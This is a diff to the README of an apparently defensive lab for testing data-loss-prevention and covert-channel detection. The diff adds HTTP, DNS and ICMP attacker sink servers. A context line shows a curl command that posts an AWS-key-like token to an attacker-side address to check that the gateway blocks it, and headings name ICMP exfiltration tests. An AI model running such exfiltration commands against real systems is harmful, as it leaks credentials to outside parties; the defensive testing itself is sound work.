@@ -4,9 +4,10 @@
 1. Start the stack: `docker compose up -d`
 2. Terminal 1 (Gateway logs): `docker compose logs -f gateway`
 3. Terminal 2 (Covert detector): `docker compose logs -f covert-detector`
-4. Terminal 3 (Attacker Sink): `docker compose exec attacker python servers/http_sink.py`
-
----
+4. Terminal 3 (Attacker Sinks):
+   - For HTTP: `docker compose exec attacker python servers/http_sink.py`
+   - For DNS: `docker compose exec attacker python servers/dns_sink.py`
+   - For ICMP: `docker compose exec attacker python servers/icmp_sink.py`
 
 ## 1. Web L7 DLP Scenarios (HTTP Port 80)
 
@@ -38,7 +39,7 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
 
 - **Expected:** `HTTP 403 Forbidden` on Victim, alert `AWS_ACCESS_KEY_ID` in Gateway logs.
 
----
+
 
 
 ## 2. Covert Channel Scenarios (L3/L4 ICMP)
@@ -51,7 +52,7 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
 
 - **Expected:** Normal packet debug logs in `covert-detector`, **0 DLP alerts** triggered.
 
----
+
 
 ### 2.2 Naive Bulk Exfiltration (Oversized Payload)
 
@@ -68,7 +69,7 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
 
 
 
----
+
 
 ### 2.3 Sensitive Data Exfiltration (L7 Inspection inside ICMP)
 
@@ -85,7 +86,7 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
 
 
 
----
+
 
 ### 2.4 Rapid Exfiltration Burst (Behavioral Rate Limiting)
 
